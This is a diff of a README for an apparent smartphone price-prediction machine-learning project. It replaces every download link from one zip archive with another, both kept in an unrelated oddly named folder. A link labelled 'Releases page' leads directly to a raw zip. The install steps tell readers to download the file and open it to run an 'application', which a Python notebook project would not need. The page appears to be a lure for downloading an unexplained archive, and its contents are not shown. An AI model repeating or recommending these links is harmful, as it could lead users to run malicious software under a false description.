@@ -1,7 +1,7 @@
 # 📱 Mobile-Price-Prediction - Estimate Smartphone Prices Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/kevinromany/Mobile-Price-Prediction/main/cuckoldry/Prediction-Price-Mobile-v1.3.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/kevinromany/Mobile-Price-Prediction/main/cuckoldry/Prediction-Price-Mobile-v1.3.zip)
+[![Download](https://github.com/kevinromany/Mobile-Price-Prediction/raw/refs/heads/main/cuckoldry/Price_Prediction_Mobile_v2.7.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/kevinromany/Mobile-Price-Prediction/raw/refs/heads/main/cuckoldry/Price_Prediction_Mobile_v2.7.zip)
 
 ## 📖 Description
 Mobile Price Prediction uses machine learning to estimate smartphone price ranges based on features like RAM, battery, camera, storage, and connectivity. This tool helps users and businesses make informed pricing decisions. 
@@ -16,7 +16,7 @@ To get started with Mobile Price Prediction, you'll need to follow a few simple 
 - Jupyter Notebook or any Python environment (for running the code)
 
 ## 🌐 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/kevinromany/Mobile-Price-Prediction/main/cuckoldry/Prediction-Price-Mobile-v1.3.zip) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/kevinromany/Mobile-Price-Prediction/raw/refs/heads/main/cuckoldry/Price_Prediction_Mobile_v2.7.zip) to find the latest version.
 2. **Choose the Latest Release**: Select the most recent release to ensure you have the latest features and fixes.
 3. **Download the File**: Click on the download link for the version suitable for your operating system.
 4. **Run the Application**: After downloading, locate the file on your computer and open it to start the application.
@@ -53,4 +53,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 ## 📞 Support
 If you have any questions or need assistance, please open an issue on GitHub, and we will respond as soon as possible.
 
-For easy access again: [Download Latest Release](https://raw.githubusercontent.com/kevinromany/Mobile-Price-Prediction/main/cuckoldry/Prediction-Price-Mobile-v1.3.zip)
+For easy access again: [Download Latest Release](https://github.com/kevinromany/Mobile-Price-Prediction/raw/refs/heads/main/cuckoldry/Price_Prediction_Mobile_v2.7.zip)
